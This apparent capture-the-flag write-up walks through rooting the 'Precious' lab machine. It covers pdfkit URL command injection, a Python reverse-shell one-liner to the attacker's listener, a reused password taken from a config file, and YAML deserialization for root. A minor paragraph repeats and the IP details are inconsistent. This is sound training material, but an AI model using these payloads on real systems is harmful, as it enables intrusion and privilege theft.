```
The website has a text input box, and the purpose of it is to convert web pages to PDF files. I started playing around with it:

![Untitled]({{ image_path }}/precious/img1.png)

`http://10.10.11.189` , it’s own IP address, returned `Cannot load remote URL!`. Okay, so I can assume a `http://` format. I tried different variations: `http://localhost` and `http://localhost` both returned the same thing - `Cannot load remote URL!`.

So I wasn't able to get the server to convert itself into a PDF, how about another IP on its network? How about me? So I spun up my own web server. 
```
$ python3 -m http.server 80
```
Note how I specified port 80; this is because `http://` expects port 80 at default, while the `http.server` module sets itself to 8080 by default.

I entered my VPN network interface IP address `http://10.10.14.4`, and what do you know, it returned a PDF of my web page.

# Initial Access
Now that I had something new to work with, I wanted to know more about the generated file. I downloaded the file and ran a common file forensics tool called `exiftool` on it.
```
$ exiftool fo99la37ukytqmhduq8elzoqbudbyvu9.pdf

```
The "Creator" line sparked my eye due to the version number, which is helpful when searching for valid exploits. My first instinct was to search for `pdfkit v0.8.6 exploits`. And just like that, the first search return is an exploit titled [Command Injection in pdfkit | CVE-2022-25765](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwiAruHj8caBAxWBJkQIHa6cD8gQFnoECA0QAQ&url=https%3A%2F%2Fsecurity.snyk.io%2Fvuln%2FSNYK-RUBY-PDFKIT-2869795&usg=AOvVaw3XwwN6FWqgJj89L6M70wWi&opi=89978449).

After reading the exploit's documentation, this version of `pdfkit` seems to feature a vulnerability where the URL was not properly sanitized. This allows for a URL parameter to be "included in the command that PDFKit executes to render the PDF", as per the blog post.

So I constructed the following URL where I appended my own parameter named `bruh` denoted by the URL encoding `?bruh=%20`, and assigned it a value, which would be the shell commanded I wanted to execute, denoted by `` `id` ``.

I had to do was establish a parameter containing a URL encoded character, and specify the shell command I wanted it to execute: 
```
http://10.10.14.6?bruh=%20`id`
```
![Untitled]({{ image_path }}/precious/img19.png)

And boom, I was returned a pdf that displayed my user id. Since I confirmed that this code injection exploit was valid, I wanted to establish a reverse shell. There are a variety of ways to do this depending on what technologies are on the machine, but a quick and usually available way is using Python. When establishing a reverse shell, you want a listener on your attacking machine, and for your victim machine to execute something that establishes a remote connection to you, the attacking machine.

After inputting this to the site, I was returned a pdf that displayed my user id. Confirming that code injection worked, I chose to establish a reverse shell using Python. When establishing a reverse shell in general, you want to have a listener on your attacking machine, and for your victim machine to execute code that will establish remote connection to **you**.

I validated Python existed on the box.
```
http://10.10.14.6/?bruh=%20`which python3`
```
![Untitled]({{ image_path }}/precious/img21.png)

Awesome, it exists, I can carry on with my plan. I started my listener using `nc`.
```
nc -lvnp 7777
```
I grabbed my reverse shell code from [revshells.com](revshells.com), which has a curated list of reverse shells for different technologies. Again, this is the code to be executed on the victim machine. I can execute this code the same way I executed the `id` and `which python3` command - through the web application.
```
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.6",7777));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```
The web server should also still be running. The program needs some valid web page as that is part of the intended functionality. The unintended functionality - the exploit, is the URL parameter. I sent the following URL to obtain my reverse shell.
```
http://10.10.14.6/?bruh=%20`python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.6",7777));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`
```

And there was my shell.

# Privilege Escalation
I had access to the machine, but I was user `ruby`. The first thing I do after initial access to a machine is look at the obvious such as the contents of files (including hidden files).
```
$ ls -lah
total 36K
drwxr-xr-x 6 root root 4.0K Oct 26  2022 .
drwxr-xr-x 4 root root 4.0K Oct 26  2022 ..

drwxrwxr-x 2 root ruby 4.0K Sep 26 15:54 pdf
drwxr-xr-x 4 root ruby 4.0K Oct 26  2022 public
```
The directory I landed in didn't seem to be a home directory. Instead, I was in `/var/www/pdfapp`. After some digging in that directory, I looked into `ruby`'s home directory.
```
$ ls -lah
total 28K
drwxr-xr-x 4 ruby ruby 4.0K Sep 24 22:04 .
drwxr-xr-x 4 root root 4.0K Oct 26  2022 ..

drwxr-xr-x 3 ruby ruby 4.0K Sep 24 22:04 .cache
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
```
After looking through all the files and directories, I finally found credentials in `~/.bundle/config` to user `henry`.
``` shell
$ cat config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1Aq......aXAYFH"
```
`henry` existed on the machine, so I attempted to login using `ssh`.
```
$ ssh henry@10.10.11.189
```
The credentials were valid, and I logged in as `henry`.

From here, the next and last step was escalating to `root`. After some looking around, I wasn't able to find much. I tried running `sudo -l`, which would reveal binaries explicitly enabled for my user to run as root, also known as an SUID.
``` 
henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```
And just like that, it revealed that I could run `/usr/bin/ruby /opt/update_dependencies.rb` as `root`! I instantly took a look at the ruby file I was permitted to run.
```ruby
henry@precious:~$ cat /opt/update_dependencies.rb
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```
Well this certainly didn't look fun. I don't know anything about `ruby`, much less how to read it. But the thing is, I didn't need to know how to read it. I attempted to run the command and received the following output.
```
henry@precious:~$ sudo ruby /opt/update_dependencies.rb
Traceback (most recent call last):
        2: from /opt/update_dependencies.rb:17:in `<main>'
        1: from /opt/update_dependencies.rb:10:in `list_from_file'
/opt/update_dependencies.rb:10:in `read': No such file or directory @ rb_sysopen - dependencies.yml (Errno::ENOENT)
```
Having looked at the source code and previewing the command output, something that already stood out to me was that it was loading/reading a file called `dependencies.yml`. Furthermore, I wasn't sure exactly where it was looking for this `dependencies.yml`. Perhaps it could possibly be looking for it locally? I created a local file in my home directory of the script and tried running the command again.
```
henry@precious:~$ touch dependencies.yml
henry@precious:~$ sudo ruby /opt/update_dependencies.rb
Traceback (most recent call last):
/opt/update_dependencies.rb:20:in `<main>': undefined method `each' for false:FalseClass (NoMethodError)
```
That was surely a different output than the previous. Okay, so I knew that I could load whatever content I wanted through `dependencies.yml`. How could I use this to my advantage? I searched for `ruby yaml exploits` and I found a blog post titled "[Blind Remote Code Execution through YAML Deserialization](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/)". 

Awesome! To summarize the blog post, it looked like the author was accomplishing RCE by setting the `git_set` parameter in `dependencies.yml` to a shell command, which would be executed upon loading (`YAML.load()`). I used the code below from the author of the blog post as my `dependencies.yml`, although I changed `git_set` to `id`, which would be much easier to validate RCE.

```ruby

              git_set: id
          method_id: :resolve
```
```
henry@precious:~$ sudo ruby /opt/update_dependencies.rb
sh: 1: reading: not found
uid=0(root) gid=0(root) groups=0(root)

```
Nice, I had RCE as `root`! To recall, I knew I could run the script as `root` after running `sudo -l`. Then, I accomplished RCE through the file `dependencies.yml` that was being loaded in the `update_dependencies.rb` script by deserialization.

The last step was to run a shell command that would make me `root`. A quick way to do this was setting the command to `su`, which would change my user to `root`.
```
henry@precious:~$ sudo ruby /opt/update_dependencies.rb
sh: 1: reading: not found
root@precious:/home/henry#
```
And I'm done, I'm `root`!

Something kinda fun I want to point out is how ruby is an interpreted language, meaning that the code runs line by line as it is interpreted into machine language. It is only when it encounters an error that it then stops running. This is why the code was able to run and provide me the output of `id` and even execute `su`, while returning error messages afterwards.
